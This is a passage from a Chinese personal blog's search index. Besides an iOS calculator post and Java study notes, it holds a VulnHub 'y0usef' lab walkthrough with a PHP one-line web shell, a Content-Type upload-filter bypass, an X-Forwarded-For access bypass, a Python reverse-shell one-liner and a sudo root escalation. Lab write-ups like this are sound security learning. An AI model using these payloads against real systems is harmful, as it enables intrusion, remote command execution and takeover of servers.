tanButton.setTitle(&quot;tan&quot;, for: UIControl.State.normal) isInv = false &#125; else &#123; lnButton.setTitle(&quot;eˣ&quot;, for: UIControl.State.normal) logButton.setTitle(&quot;10ˣ&quot;, for: UIControl.State.normal) sinButton.setTitle(&quot;sin⁻¹&quot;, for: UIControl.State.normal) cosButton.setTitle(&quot;cos⁻¹&quot;, for: UIControl.State.normal) tanButton.setTitle(&quot;tan⁻¹&quot;, for: UIControl.State.normal) isInv = true &#125;&#125; 0x05. 转动设备时的界面切换重写 didRotate 对设备旋转时的事件进行处理： 123456789override func didRotate(from fromInterfaceOrientation: UIInterfaceOrientation) &#123; let device = UIDevice.current if device.orientation == .landscapeLeft || device.orientation == .landscapeRight &#123; //横屏时候要做的事 do something launchScienceMode() &#125; else &#123; launchNormalMode() &#125;&#125; 设备旋转为横屏时，调用 launchScienceMode： 显示附加按键区，更改按钮 title 的字号，更改按钮四个角的弧度。 设备旋转为竖屏时，调用 launchNormalMode： 隐藏附加按键区，恢复按钮 title 的字号，恢复按钮四个角的弧度。 0x1. 辅助功能0x10. 等于操作的作用 自动显示运算结果的工作模式下，等于操作符的作用 使用者点击等于操作符时，会将当前的待计算表达式替换为当前的运算结果。 0x11. 更好的删除操作一般状态下使用者点击删除按钮会删除表达式中前一个字符，但当前一个字符与其之前的若干字符为一个整体时，会将其一同删除。（如 sin( 会作为一个整体同时删除） 0x12. 面向用户的报错机制当计算过程中遇到任何语法错误无法向下计算时，会返回运算结果“ERROR”提示用户更改表达式，而不会继续解析格式错误的表达式。 三、问题与解决0x0. 使 Stack View 中的空间按比例布局 tags: Swift; StoryBoard; Stack View; xcode; iOS; 比例; 布局; 控件; UIKit; 首先将 Stack View 的属性 Distribution 更改为 Fill Proportionally。 选中需要布局的控件，按住 command 键拖到该 Stack View 上， 选择 Equal Widths （若需要纵向成比例布局，则选择 Equal Heights）添加约束。 Additional Buttons.width = 0.4285 × width 即表示控件 Additional Buttons 的宽为 Stack View 宽度的42.85%。 0x1. Swift获取当前设备的状态 tags: Swift; StoryBoard; xcode; iOS; 横屏; 竖屏; 设备状态; 123456let device = UIDevice.current // 获取当前设备对象// 通过orientation属性获取设备朝向if device.orientation == .landscapeLeft || device.orientation == .landscapeRight &#123; // 横屏时要做的事 ...&#125; 0x2. 代码实现修改Button字体大小 tags: Swift; xcode; iOS; UIButton; 字体大小; 123456// 获取指定大小的字体func getFont(size: CGFloat) -&gt; UIFont &#123; return UIFont.systemFont(ofSize: size)&#125;// 修改原有字体expLabel.font = getFont(size: 38.0) 0x3. 设置圆形的Button在 xcode 中为 Button 添加如下属性： 代码实现： 1dotButton.layer.cornerRadius = 40.0 该属性为 Button 四角的弧度，经调整后即可实现圆形的 Button。 四、成果展示0x00. 完整流程https://blog.kekwy.com/media/iw1/01.mp4 0x01. 压力测试（随便乱按）https://blog.kekwy.com/media/iw1/test.mov","categories":[{"name":"iOS智能应用开发","slug":"iOS智能应用开发","permalink":"http://blog.kekwy.com/categories/iOS%E6%99%BA%E8%83%BD%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"开发","slug":"开发","permalink":"http://blog.kekwy.com/tags/%E5%BC%80%E5%8F%91/"},{"name":"iOS","slug":"iOS","permalink":"http://blog.kekwy.com/tags/iOS/"},{"name":"Xcode","slug":"Xcode","permalink":"http://blog.kekwy.com/tags/Xcode/"}],"author":"Ke_DiWZ"},{"title":"【渗透测试】第一周 vulnhub-y0usef","slug":"vulnhub-y0usef","date":"2022-09-27T04:44:31.000Z","updated":"2022-11-06T14:33:08.969Z","comments":true,"path":"vulnhub-y0usef/","link":"","permalink":"http://blog.kekwy.com/vulnhub-y0usef/","excerpt":"","text":"第一周 可弟WZ 主页：blog.kekwy.com 邮箱：&#x6b;&#101;&#x65;&#x6b;&#x6b;&#x65;&#x77;&#x79;&#64;&#x71;&#x71;&#46;&#99;&#111;&#109; 2022年9月27日 一、实验准备靶机：y0usef 下载链接：https://www.vulnhub.com/entry/y0usef-1,624/ 攻击机：kali 二、实验目标取得目标靶机的root权限和2个flag。 三、实验内容 在VirtualBox中同时启动kali攻击机和第三周靶机，并保证两者位于同一局域网下。 在kali中执行以下指令进行局域网主机发现： 1$ sudo arp-scan -I eth0 -l 扫描结果如下： 可以推断1出靶机 地址为 10.0.2.5 。 1： 推断方式很多，可以挨个扫描端口，可以控制变量（不开靶机扫描一次，启动靶机后再扫描一次），可以对比扫描结果与靶机的mac地址，也可以是经验之谈。 在kali中执行以下指令扫描靶机的端口状态： 1$ sudo nmap -p- 10.0.2.5 扫描结果如下： 发现开通了22、80两个端口，提示我们可以考虑靶机上的ssh与http服务。为了进一步确定各端口的用途，我们可以通过以下指令2获取对应的服务版本信息： 1$ sudo nmap -p22,80 -sV -sC 10.0.2.5 2: -p 对指定端口扫描 ​ -sV -sC 默认安全脚本扫描 扫描结果如下： 我们根据靶机开放的80端口，推测可以去网页上寻找突破口。于是在kali中打开浏览器，并输入靶机的IP，进入在靶机上运行的网站，顺便查看网站的源码： 但是发现网站与其源码中均无对我们有帮助的信息，再尝试能否查看靶机上的robots.txt文件3： 但令人遗憾的是，我们并不能查看该文件。 3: Robots协议（也称为爬虫协议、机器人协议等）的全称是“网络爬虫排除标准”（Robots Exclusion Protocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。obots.txt文件是一个文本文件。robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉网络爬虫在服务器上什么文件是可以被查看的。 使用whatweb工具查看web应用所采用的软件构架： 1$ whatweb http://10.0.2.5 尝试使用工具dirsearch爆破 web 服务端的路径，发现一些隐藏的路径和文件： 1$ dirsearch -u http://10.0.2.5 结果如下： 得知4服务器上有三个我们可以访问的文件： 123/adminstration/index.php/index.php/login 其中，通过后两个文件的url进入服务器后的页面与此前相同，仍无有价值信息。 4: HTTP的状态码可分为五大类：1xx-临时响应、2xx-成功、3xx-重定向、4xx-请求错误、5xx-服务器错误。 上述结果中出现的状态码的含义分别为： 状态码 含义 403 (禁止)服务器拒绝请求。 301 (永久移动)请求的网页已永久移动到新位置。服务器返回此响应(对 GET 或 HEAD 请求的响应)时，会自动将请求者转到新位置。 200 (成功)服务器已成功处理了请求。通常，这表示服务器提供了请求的网页。 访问10.0.2.5/adminstration： 提示我们没有权限，需要进行“绕过”。这里我们采用“X系列头部绕过”的方式： 启动Burp Suit并启用拦截，将浏览器代理设置为127.0.0.1:8080（Burp Suit的默认代理端口为8080）。 刷新页面，Burp Suit弹出拦截窗口，在被拦截的数据包中加入X-Forwarded-For: 127.0.0.15（如下图），再将其发送。【后续被拦截的数据包都需要插入上述内容。】 发现成功进入一个登录界面： 这里我们可以直接尝试一下弱口令，用户名和密码都输入admin，发现登入成功了。 5: 让靶机服务器误以为该报文是从其本地发起的，从而获取访问权限。 简单浏览了各个页面之后，发现没有什么直接可用的信息，但是这里的文件上传功能引起了我们的注意。 首先编写一个“一句话木马”的PHP 文件shell.php，内容如下： 1&lt;?php $var=shell_exec($_GET[&#x27;cmd&#x27;]); echo $var?&gt; 尝试直接将其上传，发现网站提示文件被拒绝： 推测网站可能存在针对文件类型的过滤6，我们可以通过修改被拦截的报文中Content-Type字段的值进行绕过： 修改为：image/png： 文件上传成功了，并提供了上传完成的文件的URL。 6: 常见的过滤形式与绕过方法： 针对文件扩展名的绕过： 修改文件扩展名后，再上传。 2)针对文件类型的绕过： 修改报文中的Content-Type字段（如本次实验）。 3)针对文件内容的绕过： 在文件内容的前面添加上符合文件类型要求的数据，中间穿插我们的代码。 通过URL访问文件： 1http://10.0.2.5/adminstration/upload/files/1663725708shell.php 进入了一片空白的页面，说明该url正确。再尝试输入指令，测试代码是否可以正常运行： 1http://10.0.2.5/adminstration/upload/files/1663725708shell.php?cmd=ls 指令成功运行，到此为止我们就可以通过url让目标靶机执行反弹shell的代码了。首先，先试探一下靶机的语言环境： 1http://10.0.2.5/adminstration/upload/files/1663725708shell.php?cmd=which python 得到了靶机上的python路径，说明靶机有python环境： 故我们可以利用python版的反弹shell代码实现反弹shell，首先在kali上监听某一个端口（如4444端口）： 1$ nc -nvlp 4444 修改对应的python代码： 1python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27; 其中ip修改为kali的ip，port修改为刚才设置监听的端口。本次实验中分别为10.0.2.15、4444. 将修改好的代码插入上述URL中对应的参数位置（”cmd&#x3D;”之后），再次访问，发现kali的shell成功监听到靶机的反弹shell： 使用以下指令对反弹shell进行一个简单的升级: 1$ python -c &quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot; 查看&#x2F;etc&#x2F;passwd 文件7： 1$ cat /etc/passwd 注意到有以下一项： 1yousef:x:1000:1000:yousef,,,:/home/yousef:/bin/bash 说明有一个叫yousef的用户可以登录系统8，且主目录为/home/yousef。 进入该用户的主目录，发现文件user.txt。查看内容，发现第一个flag。 7: 在Linux系统中的passwd文件中，每一行对应一个用户的一组信息，每项信息用冒号隔开： 1用户名 : 密码 : uid : gid : 用户描述 : 主目录 : 登录shell 8: 对于用户的登录shell： /bin/false 是最严格的禁止login选项，一切服务都不能用， /bin/nologin 只是不允许系统login，可以使用其他ftp等服务 因此我们一眼就锁定了yousef用户（靶机passwd中的大部分用户都不能进行系统登录），而speech-dispatcher、guest-cpxNn2貌似也可以系统登录，但他们的用户名比较奇怪，不作为首选目标，当然也可以都去他们的主目录看一看，结果发现flag在yousef中，还是选择yousef作为突破口。 第一个flag经过base64解码后，得到yousef用户可用于ssh登录的用户名和密码。恰好我们一开始就得知靶机在开放端口22上提供了ssh服务，故我们可以尝试使用ssh登入yousef。 退出反弹shell，在kali的shell使用以下指令： 1$ ssh yousef@10.0.2.5 成功登入yousef后，查看该用户所在的用户组： 1$ id 发现该用户属于sudo组，查看该用户可执行的指令： 1$ sudo -l 发现该用户可以执行所有的系统指令，则我们可以直接切换为root身份： 1$ sudo -i 查看root用户主目录下的文件，发现文件root.txt，查看并使用base64解码得到最后一个flag。 至此我们实现了root权限的提取，并成功获取了所有的两个flag。 【完结撒花】","categories":[{"name":"网络攻防实战","slug":"网络攻防实战","permalink":"http://blog.kekwy.com/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/"}],"tags":[{"name":"学习","slug":"学习","permalink":"http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"Kali","slug":"Kali","permalink":"http://blog.kekwy.com/tags/Kali/"},{"name":"网络","slug":"网络","permalink":"http://blog.kekwy.com/tags/%E7%BD%91%E7%BB%9C/"},{"name":"安全","slug":"安全","permalink":"http://blog.kekwy.com/tags/%E5%AE%89%E5%85%A8/"},{"name":"Linux","slug":"Linux","permalink":"http://blog.kekwy.com/tags/Linux/"},{"name":"vulnhub","slug":"vulnhub","permalink":"http://blog.kekwy.com/tags/vulnhub/"}],"author":"Ke_DiWZ"},{"title":"集合类与I/O操作","slug":"javaNotes-3","date":"2022-08-05T00:15:26.000Z","updated":"2022-08-06T15:39:01.691Z","comments":true,"path":"javaNotes-3/","link":"","permalink":"http://blog.kekwy.com/javaNotes-3/","excerpt":"","text":"数组的长度是固定的，集合的长度是可变的。 I. Collection接口 collection 接口时层次结构中的根接口，构成其的单位称为元素。 常用方法： 方法 功能描述 add(E e) 将指定的对象添加到该集合中 remove(Object o) 将指定的对象从该集合中移除 isEmpty() 返回boolean值，用于判断当前集合是否为空 iterator() 返回在此Collection的元素上进行迭代的迭代器，用于遍历集合中的对象 size() 返回int型值，获取该集合中元素的个数 通过迭代器遍历： 1234567import java.util.*;Collection&lt;String&gt; list = new ArrayList&lt;&gt;(); //将List实现类向上转型Iterator&lt;String&gt; it = list.iterator(); //创建迭代器while(it.hasNext()) &#123; //do something String str = (String) it.next();&#125; //遍历 tips：Iterator 的 next() 方法返回的是 Object 。 II. List集合 List集合包括List接口以及List接口的所有实现类； 允许元素重复，元素顺序就是对象的插入顺序； 包含Collection中的所有方法，此外还有如下两个重要方法： get(int index)：获得指定索引位置的元素； set(int index, Object obj)：将集合中指定索引位置的对象修改为指定的对象； 实现类：ArrayList（数组实现）、LinkedList（链表实现）。 III. Set集合 不按特定方式排序，不能包含重复元素，需要小心操作其中的可变对象； 实现类; HashSet：不保证迭代顺序永恒不变； TreeSet：额外实现了 java.util.SortedSet 接口，可以对集合中元素进行排序。 TreeSet 类增加的方法： 方法 功能描述 first() 返回此Set中当前第一个（最低）元素 last() 返回此Set中当前最后一个（最高）元素 comparator() 返回对此set中的元素进行排序的比较亲。如果此Set使用自然顺序，则返回null headSet(E toElement) 返回一个新的Set集合，新集合是 toElement（不包含）之前的所有对象 subSet(E fromElement, E toElement) 返回一个新的Set集合，是fromElement（包含）对象与toElement（不包含）对象之间的所有对象 tailSet(E fromElement) 返回一个新的Set集合，新集合包含对象 fromElement（包含）之后的所有对象 IV. Map集合 一个映射不能包含重复的key，每个key最多只有&#x3D;能映射到一个值。 常用方法： 方法 功能描述 put(K key, V value) 向集合中添加指定的可以呢与value的映射关系 containsKey(Object key) 如果此映射包含指定key的映射关系，则返回true containsValue(Object value) 如果此映射将一个或多个key映射到指定值，则返回true get(Object key) 如果存在指定的key对象，则返回该对象对应的值，否则返回null keySet() 返回该集合中的所有key对象形成的Set集合 values() 返回该集合中所有值对象形成的Collection集合 实现类： HashMap：基于哈希表实现，允许使用null值与null键，不保证顺序。（建议使用） TreeMap：可排序，不允许null键。 V. File类File构造方法 通过完整路径名（包含文件名）： 1File(String pathname); 通过父路径与子路径（包含文件名）： 1File(String parent, String child); 通过父路径对象与子路径（包含文件名）： 1File(File f, String pathname); 文件创建与删除123File file = new File(&quot;word.txt&quot;);file.delete(); //删除文件file.creatNewFile(); //创建文件 常用方法 方法 返回值 说明 getName() String 获取文件名称 canRead() boolean 判断文件是否为可读的 canWrite() boolean 判断文件是否可被写入 exits() boolean 判断文件是否存在 length() long 获取文件的长度（以字节为单位） getAbsolutePath() String 获取文件的绝对路径 getParent() String 获取文件的父路径 isFile() boolean 判断文件是否存在 isDirectory boolean 判断文件是否为一个目录 isHidden() boolean 判断文件是否为隐藏文件 lastModified() long 获取文件最后修改时间","categories":[{"name":"从继承开始的Java应用笔记","slug":"从继承开始的Java应用笔记","permalink":"http://blog.kekwy.com/categories/%E4%BB%8E%E7%BB%A7%E6%89%BF%E5%BC%80%E5%A7%8B%E7%9A%84Java%E5%BA%94%E7%94%A8%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://blog.kekwy.com/tags/Java/"},{"name":"学习","slug":"学习","permalink":"http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"编程","slug":"编程","permalink":"http://blog.kekwy.com/tags/%E7%BC%96%E7%A8%8B/"}],"author":"Ke_DiWZ"},{"title":"类的高级特性与异常处理","slug":"javaNotes-2","date":"2022-08-01T11:50:13.000Z","updated":"2022-08-04T04:25:52.401Z","comments":true,"path":"javaNotes-2/","link":"","permalink":"http://blog.kekwy.com/javaNotes-2/","excerpt":"","text":"I. Java类包 类名冲突： 任何类与接口都需要隶属于某一个类包。可以通过将两个同名类定义在不同的类包中解决类名冲突的问题。 类的路径： 同一个类包中的类相互访问时，可以不指定包名； 同一个包中的类不必存放在同一个位置，只要将CLASSPATH分别指向这两个位置即可。 指定包与导入包： 将 package 表达式作为文件中的第一行非注释代码，java包名必须全部使用小写字母。 1package 包名; 导入包： 123import 包名.*import 包名.类名import 包名.静态方法名 tips: 使用 import 关键字指定一个包中的所有类时，并不会指定这个包的子包中的类，如需使用需要对子包作单独引用。 II. final 关键字 变量： 修饰常量变量； 对象引用被 final 修饰后无法使其指向另一个对象； Java中定义全局变量，通常使用 public static final 修饰，是能在定义时被赋值。 方法： 被 final 修饰的方法不能被重写； private 方法隐式被指定为 final 类型。 类： 被修饰的类不能被继承。 III. 内部类成员内部类 基础用法： 成员内部类的定义：（非内部类不能被声明为private或protected访问类型） 12345public class OuterClass &#123; // 外部类 private class InnerClass &#123; // 内部类 //... &#125;&#125; 内部类中可以访问外部类的所有成员变量和方法，外部类只能通过实例化内部类对象访问内部类成员（受权限修饰关键字限制）； 内部类中的变量与外部类变量同名时，可以使用 this 指针加以区分： 1234// 若内部类与外部类中均有变量xthis.x; // 内部类的xOuterClass.this.x; // 外部类的xx; // 同名局部变量、形参（若有） 在外部类和非静态方法之外实例化内部类对象，需要使用外部类： 12OuterClass out = = new OuterClass();OuterClass.innerClass in = out.new innerClass(); 内部类对象会依赖于外部类对象。只有存在外部类对象，才能实例化内部类对象。 内部类向上转型为接口; 将一个权限修饰符为 private 的内部类向上转型为一个接口，就可以完全隐藏内部类的具体实现过程； 对于一个外部接口中的方法，可以通过在一个类中定义多个内部类，每个内部类分别实现该方法的方式，实现在类中多次实现接口中的同一个方法； 12345678910111213141516171819202122interface OutInterface &#123; public void f();&#125;class OuterClass &#123; // 定义一个外部不可访问的内部类 private class InnerClass implements OutInterface &#123; // 实现接口方法 public void f() &#123; // do something... &#125; &#125; public OutInterface doit &#123; return new InnerClass(); // 将内部类向上转型为外部接口 &#125;&#125;...OuterClass out = new OuterClass();OutInterface outinter = out.doit();outinter.f();... 外部不可直接访问内部类中的 f() 方法但是可以访问接口中的，通过将内部类向上转型执行内部类中定义的方法，对继承外部类的子类隐藏了实现细节。（向外提供外部类和接口） 局部内部类 内部类可以在类的局部位置定义（如方法） 在方法中定义的内部类只能使用方法中被 final 修饰的变量。因为内部类对象的生存期超出方法运行的生存期，导致方法中的一般局部变量比内部类对象的生存期短，而被final型变量被视为常量，其生存期同样比方法运行的生存期长。 匿名内部类123return new A() &#123; ...//内部类体&#125;; 匿名内部类编译以后，产生以“外部类名$序号”为名称的.class文件，序号以1~n排列。 静态内部类 创建静态内部类的对象不需要其外部类的对象； 静态内部类的对象中不能访问非静态外部类的对象。 内部类的继承1234567891011public class OutputInnerClass extends ClassA.ClassB &#123; public OutputInnerClass(classA a) &#123; a.super(); // 生成B类的外部类对象 &#125;&#125;class ClassA &#123; class ClassB &#123; &#125;&#125; IV. 异常捕捉 try-catch 语句： 123456try &#123; // 可以发生异常的代码块&#125;catch(Exception e)&#123; // 异常处理&#125; finally 语句： 无论 try 中的语句是否发生异常，都会执行 finally 中的代码块。finally 不被执行的情况： finally 中发生异常； 之前的代码中使用 System.exit() 退出程序； 程序所在的线程死亡； 关闭CPU。 tips： Exception 是 try 代码传递给 catch 代码块的变量类型； 异常处理常用的函数： getMessage() ：输出错误性质； toString() ：给出异常的类型与性质； printStackTrace() ：指出异常的类型、性质、栈层次及出现在程序中的位置。 V. Java常见异常 异常类 说明 ClassCastException 类型转换异常 ClassNotFoundException 未找到相应类异常 ArithmeticException 算术异常 ArrayIndexOutOfBoundsException 数组下标越界异常 ArrayStoreException 数组中包含不兼容的值抛出的异常 SQLException 操作数据库异常 NullPointerException 空指针异常 NoSuchFieldException 字段未找到异常 NoSuchMethodException 方法未找到异常 NumberFormatException 字符串转换为数字抛出的异常 NegativeArraySizeException 数组元素个数为负数抛出的异常 StringIndexOutOfBoundsException 字符串索引超出范围抛出的异常 IOException 输入输出异常 IllegalAccessException 不允许访问某类异常 InstantiationException 当应用程序试图使用 Class 类中的 new Instance() 方法创建一个类的实例，而指定的类的对象无法被实例化时，抛出该异常 EOFException 文件已结束异常 FileNotFoundException 文件未找到异常 VI. 自定义异常12345public class MyException extends Exception &#123; public MyException(String ErrorMessage) &#123; // ErrorMessage为要输出的错误信息 super(ErrorMessage); // 调用父类构造方法 &#125;&#125; VII. 抛出异常 throws：用于指定方法可能抛出的异常，用于将异常向上抛出。 12static void pop() throws 异常1, 异常2, ... &#123;&#125; throw： 程序在执行到 throw 语句时立即终止，其后语句都不执行； throw 抛出的异常必须使用 try-catch 语句快捕捉； 若想向上级抛出异常，必须在抛出异常的方法中使用 throws。 参考资料《Java从入门到精通（第5版）》","categories":[{"name":"从继承开始的Java应用笔记","slug":"从继承开始的Java应用笔记","permalink":"http://blog.kekwy.com/categories/%E4%BB%8E%E7%BB%A7%E6%89%BF%E5%BC%80%E5%A7%8B%E7%9A%84Java%E5%BA%94%E7%94%A8%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://blog.kekwy.com/tags/Java/"},{"name":"学习","slug":"学习","permalink":"http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"编程","slug":"编程","permalink":"http://blog.kekwy.com/tags/%E7%BC%96%E7%A8%8B/"}],"author":"Ke_DiWZ"},{"title":"接口、继承与多态","slug":"javaNotes-1","date":"2022-07-30T07:00:16.000Z","updated":"2022-08-01T11:51:42.005Z","comments":true,"path":"javaNotes-1/","link":"","permalink":"http://blog.kekwy.com/javaNotes-1/","excerpt":"","text":"I. 类的继承权限修饰关键字： private 外部以及子类均不可访问 public 外部以及子类均不可访问 protected 外部不可，但子类可以访问 定义类时通过关键字extends + 父类类名定义继承； 子类方法中可以通过super关键字调用父类方法（受权限修饰关键字约束）； 子类中可以通过定义与父类某一方法名称相同的函数实现对父类中该方法的重写（覆盖）； 重写时如修改方法的权限范围，只能从小到大； 重写时返回值必须与父类中同名函数返回值相同或为其子类； 子类实例化时会自动调用父类的无参构造方法，但若需调用有参构造方法需要通过super关键字手动调用； 子类finalize()方法需要保证最后一个动作是调用父类的finalize()方法； 1234567891011121314151617181920212223242526272829303132333435class Test &#123; public Test() &#123; //do something &#125; public void doSomething1() &#123; //do something &#125; private void doSomething2() &#123; //do something &#125; protected void doSomething3() &#123; //do something &#125; public Test doTest() &#123; //do something &#125;&#125;class Test1 extends Test&#123; public Test() &#123; super(); //调用父类构造方法 super.doSomething1(); &#125; public void doSomething3() &#123; //do something &#125; /* private void doSomething3() &#123; //do something &#125; 写法错误 */ public Test1 doTest() &#123; //do something &#125;&#125; II. Object类 Objcect 类是所有Java类的父类。 tips：Object 类中的 getClass() 、notify() 、notifyAll() 、wait() 等方法不能在子类中重写。（被定义为final类型） Object 类中的重要方法： getClass()：返回对象执行时的Class实例。（Unity的getObejct） toString()：将一个对象返回为字符串，一般需要根据需要在子类中重写. tips：将对象打印时将自动调用该方法。 equals()：默认使用“&#x3D;&#x3D;”运算符根据对象的引用（地址）判断是否相等。故一般需要按需重写。 III. 对象类型的转换 向上转型：将子类对象视为父类对象。由具体到抽象，总是安全的。 1Quadrangle obj = new Patallelogram(); // 平行四边形是四边形的子类 向下转型：将父类对象转换为子类对象，必须通过强制类型转换，且必须保证当前父类对象是目标子类对象的实例。 12Quadrangle p = new Patallelogram();Patallelogram q = (Patallelogram)p; IV. 使用instanceof操作符判断对象类型可用于实现向下转换时对父类对象实例类型的判断。 语法格式：（返回值为布尔型） 12myobject instanceof ExampleClass;// myobject对象是否为ExampleClass类的实例 V. 方法的重载同过定义同名方法但参数不完全相同的方式实现方法的重载，但单单返回值不同不能实现重载。 编译器利用方法名、方法各参数类型和参数的个数以及参数的顺序来确定类中的方法是否唯一。 不定长参数也可以参与实现重载： 12int add(int a);int add(int... a); VI. 抽象类与接口 抽象类 tips： 抽象类不能实例化对象； 只有抽象类才可以承载抽象方法； 抽象方法在其子类中必须被重写。 定义抽象类的关键字 abstract 。 123public abstract class Test &#123; abstract void testAbstract();&#125; 接口： 定义接口使用关键字 interface ： 1234public interface 接口名 &#123; void doSomething(); // 自动虚方法，可以省略abstract关键字&#125; public：接口可以像类一样被权限修饰符修饰，但public关键字仅限于接口在与其同名的文件中被定义时； 接口中的方法必须被定义为public或abstract形式。 实现接口使用关键字 implements ： tips：Java中不许出现多继承但是可以通过同一个类实现许多接口来实现多继承，一个接口也可以继承另一个接口。 123456789101112#1class 类名 implements 接口1，接口2, ... &#123; &#125;#2interface intf1 &#123; &#125;interface intf2 extends intf1 &#123; &#125; 参考资料《Java从入门到精通（第5版）》","categories":[{"name":"从继承开始的Java应用笔记","slug":"从继承开始的Java应用笔记","permalink":"http://blog.kekwy.com/categories/%E4%BB%8E%E7%BB%A7%E6%89%BF%E5%BC%80%E5%A7%8B%E7%9A%84Java%E5%BA%94%E7%94%A8%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://blog.kekwy.com/tags/Java/"},{"name":"学习","slug":"学习","permalink":"http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"编程","slug":"编程","permalink":"http://blog.kekwy.com/tags/%E7%BC%96%E7%A8%8B/"}],"author":"Ke_DiWZ"}],"categories":[{"name":"考研复习","slug":"考研复习","permalink":"http://blog.kekwy.com/categories/%E8%80%83%E7%A0%94%E5%A4%8D%E4%B9%A0/"},{"name":"问题记录","slug":"问题记录","permalink":"http://blog.kekwy.com/categories/%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/"},{"name":"服务端开发","slug":"服务端开发","permalink":"http://blog.kekwy.com/categories/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%BC%80%E5%8F%91/"},{"name":"iOS智能应用开发","slug":"iOS智能应用开发","permalink":"http://blog.kekwy.com/categories/iOS%E6%99%BA%E8%83%BD%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/"},{"name":"网络攻防实战","slug":"网络攻防实战","permalink":"http://blog.kekwy.com/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/"},{"name":"从继承开始的Java应用笔记","slug":"从继承开始的Java应用笔记","permalink":"http://blog.kekwy.com/categories/%E4%BB%8E%E7%BB%A7%E6%89%BF%E5%BC%80%E5%A7%8B%E7%9A%84Java%E5%BA%94%E7%94%A8%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"http://blog.kekwy.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"OS","slug":"OS","permalink":"http://blog.kekwy.com/tags/OS/"},{"name":"考试","slug":"考试","permalink":"http://blog.kekwy.com/tags/%E8%80%83%E8%AF%95/"},{"name":"复习","slug":"复习","permalink":"http://blog.kekwy.com/tags/%E5%A4%8D%E4%B9%A0/"},{"name":"笔记","slug":"笔记","permalink":"http://blog.kekwy.com/tags/%E7%AC%94%E8%AE%B0/"},{"name":"Flowable","slug":"Flowable","permalink":"http://blog.kekwy.com/tags/Flowable/"},{"name":"data source","slug":"data-source","permalink":"http://blog.kekwy.com/tags/data-source/"},{"name":"Java","slug":"Java","permalink":"http://blog.kekwy.com/tags/Java/"},{"name":"Spring Boot","slug":"Spring-Boot","permalink":"http://blog.kekwy.com/tags/Spring-Boot/"},{"name":"开发","slug":"开发","permalink":"http://blog.kekwy.com/tags/%E5%BC%80%E5%8F%91/"},{"name":"软件工程","slug":"软件工程","permalink":"http://blog.kekwy.com/tags/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/"},{"name":"Spring","slug":"Spring","permalink":"http://blog.kekwy.com/tags/Spring/"},{"name":"后端","slug":"后端","permalink":"http://blog.kekwy.com/tags/%E5%90%8E%E7%AB%AF/"},{"name":"iOS","slug":"iOS","permalink":"http://blog.kekwy.com/tags/iOS/"},{"name":"Xcode","slug":"Xcode","permalink":"http://blog.kekwy.com/tags/Xcode/"},{"name":"学习","slug":"学习","permalink":"http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"Kali","slug":"Kali","permalink":"http://blog.kekwy.com/tags/Kali/"},{"name":"网络","slug":"网络","permalink":"http://blog.kekwy.com/tags/%E7%BD%91%E7%BB%9C/"},{"name":"安全","slug":"安全","permalink":"http://blog.kekwy.com/tags/%E5%AE%89%E5%85%A8/"},{"name":"Linux","slug":"Linux","permalink":"http://blog.kekwy.com/tags/Linux/"},{"name":"vulnhub","slug":"vulnhub","permalink":"http://blog.kekwy.com/tags/vulnhub/"},{"name":"编程","slug":"编程","permalink":"http://blog.kekwy.com/tags/%E7%BC%96%E7%A8%8B/"}]}